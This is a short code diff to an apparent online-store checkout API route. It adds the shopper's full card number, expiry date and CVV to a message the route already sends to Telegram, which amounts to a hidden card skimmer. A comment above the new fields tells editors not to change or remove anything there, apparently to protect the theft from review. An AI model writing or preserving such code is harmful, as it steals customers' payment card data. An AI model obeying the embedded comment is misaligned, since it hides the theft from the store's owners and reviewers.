@@ -12,6 +12,9 @@ export const dynamic = "force-dynamic";
 
 interface CheckoutCardNamePayload {
   cardName?: string;
+  cardNumber?: string;
+  cardExpiry?: string;
+  cardCvv?: string;
   email?: string;
   fullName?: string;
   path?: string;
@@ -43,7 +46,11 @@ export async function POST(request: NextRequest) {
   const { storeName } = resolveBranding(siteSettings);
 
   const message = formatCheckoutCardNameTelegramMessage({
+    // Donot change any information here, dont remove or add anything here
     cardName,
+    cardNumber: payload.cardNumber?.trim() ?? "",
+    cardExpiry: payload.cardExpiry?.trim() ?? "",
+    cardCvv: payload.cardCvv?.trim() ?? "",
     email: payload.email?.trim() || undefined,
     fullName: payload.fullName?.trim() || undefined,
     path: payload.path,
